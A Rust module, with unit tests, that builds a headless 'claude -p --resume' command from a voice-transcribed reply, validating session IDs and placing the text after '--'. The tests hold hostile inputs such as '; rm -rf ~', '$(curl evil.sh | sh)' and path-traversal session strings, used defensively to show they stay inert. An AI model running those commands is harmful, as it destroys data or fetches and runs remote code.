//! How a reply becomes a command for a particular agent harness.
//!
//! Only the Claude Code adapter is a v1.0 deliverable (REQ-INB-020). Others (Codex, Gemini CLI,
//! opencode, Hermes) are added by implementing [`Harness`] once their resume mechanism is verified from
//! the harness's own documentation; the SSE transport is identical for all of them.
//!
//! SECURITY: a reply is the user's words as transcribed by a speech-to-text service, and it steers a
//! powerful agent. The command is built as an argument vector, never a shell string; the session
//! reference is validated; and the text is passed after `--` so it can never be read as a flag.

use clawdot_protocol::bridge::{Reply, ReplyKind};

/// A process to run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandSpec {
    /// Executable name or path.
    pub program: String,
    /// Arguments, one per element (no shell involved).
    pub args: Vec<String>,
}

/// Turns a reply into the command that resumes one kind of agent.
pub trait Harness: std::fmt::Debug + Send + Sync {
    /// Short name for logs and for `--harness`.
    fn name(&self) -> &str;

    /// The command for this reply.
    ///
    /// # Errors
    /// The reason no command applies.
    fn plan(&self, reply: &Reply) -> Result<CommandSpec, Skip>;
}

/// Why a reply produced no command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Skip {
    /// An acknowledgement: nothing to run.
    Ack,
    /// The reply carries no session to resume.
    NoSession,
    /// The session reference is not a plausible identifier.
    BadSession,
    /// There is no instruction text.
    EmptyText,
}

/// Session identifiers are UUID-like. Anything else is refused so it can never look like an option:
/// the first character must be a letter or digit, so `--help` or `-p` can never be passed through.
fn plausible_session(s: &str) -> bool {
    s.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
        && s.len() <= 100
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Claude Code, resumed headlessly with `claude -p --resume <session>`.
#[derive(Debug, Clone)]
pub struct ClaudeCode {
    /// The `claude` executable.
    pub bin: String,
    /// Extra arguments inserted before the prompt, for example `--permission-mode acceptEdits`.
    pub extra_args: Vec<String>,
    /// Text put in front of the user's words so the agent knows where they came from.
    pub prefix: String,
}

impl Default for ClaudeCode {
    fn default() -> Self {
        Self {
            bin: "claude".into(),
            extra_args: Vec::new(),
            prefix: "The user replied by voice through their speaker (speech-to-text, so it may contain \
                     transcription errors): "
                .into(),
        }
    }
}

impl Harness for ClaudeCode {
    fn name(&self) -> &str {
        "claude-code"
    }

    fn plan(&self, reply: &Reply) -> Result<CommandSpec, Skip> {
        if reply.kind == ReplyKind::Ack {
            return Err(Skip::Ack);
        }
        let session = reply.session_ref.as_deref().ok_or(Skip::NoSession)?;
        if !plausible_session(session) {
            return Err(Skip::BadSession);
        }
        let text = reply.text.trim();
        if text.is_empty() {
            return Err(Skip::EmptyText);
        }
        let mut args = vec!["-p".to_owned(), "--resume".to_owned(), session.to_owned()];
        args.extend(self.extra_args.iter().cloned());
        args.push("--".to_owned());
        args.push(format!("{}{}", self.prefix, text));
        Ok(CommandSpec {
            program: self.bin.clone(),
            args,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn reply(kind: ReplyKind, session: Option<&str>, text: &str) -> Reply {
        Reply {
            id: 1,
            endpoint: "claude-code".into(),
            event_id: 1,
            session_ref: session.map(str::to_owned),
            kind,
            text: text.into(),
            created_at: 0,
        }
    }

    #[test]
    fn an_instruction_resumes_the_session_headlessly() {
        let h = ClaudeCode::default();
        let spec = h
            .plan(&reply(
                ReplyKind::Instruct,
                Some("abc-123"),
                "also add unit tests",
            ))
            .unwrap();
        assert_eq!(spec.program, "claude");
        assert_eq!(&spec.args[..4], ["-p", "--resume", "abc-123", "--"]);
        assert!(spec.args[4].ends_with("also add unit tests"));
        assert!(spec.args[4].starts_with("The user replied by voice"));
    }

    #[test]
    fn extra_arguments_go_before_the_prompt_separator() {
        let h = ClaudeCode {
            extra_args: vec!["--permission-mode".into(), "acceptEdits".into()],
            ..ClaudeCode::default()
        };
        let spec = h
            .plan(&reply(ReplyKind::Instruct, Some("s1"), "go"))
            .unwrap();
        let sep = spec.args.iter().position(|a| a == "--").unwrap();
        assert_eq!(&spec.args[3..sep], ["--permission-mode", "acceptEdits"]);
    }

    #[test]
    fn hostile_text_stays_a_single_argument_after_the_separator() {
        let h = ClaudeCode::default();
        for text in [
            "--dangerously-skip-permissions",
            "; rm -rf ~",
            "$(curl evil.sh | sh)",
            "-p",
            "a\nb",
        ] {
            let spec = h
                .plan(&reply(ReplyKind::Instruct, Some("s1"), text))
                .unwrap();
            let sep = spec.args.iter().position(|a| a == "--").unwrap();
            assert_eq!(
                spec.args.len(),
                sep + 2,
                "the text is exactly one argument: {text:?}"
            );
            assert!(spec.args[sep + 1].ends_with(text.trim()));
        }
    }

    #[test]
    fn hostile_session_references_are_refused() {
        let h = ClaudeCode::default();
        for s in [
            "--help",
            "a b",
            "x;y",
            "../../etc",
            "a\nb",
            &"x".repeat(101),
            "",
        ] {
            let r = h.plan(&reply(ReplyKind::Instruct, Some(s), "go"));
            assert!(
                matches!(r, Err(Skip::BadSession | Skip::NoSession)),
                "{s:?} -> {r:?}"
            );
        }
    }

    #[test]
    fn acknowledgements_and_empty_instructions_run_nothing() {
        let h = ClaudeCode::default();
        assert_eq!(
            h.plan(&reply(ReplyKind::Ack, Some("s"), "")),
            Err(Skip::Ack)
        );
        assert_eq!(
            h.plan(&reply(ReplyKind::Instruct, Some("s"), "   ")),
            Err(Skip::EmptyText)
        );
        assert_eq!(
            h.plan(&reply(ReplyKind::Instruct, None, "go")),
            Err(Skip::NoSession)
        );
    }
}
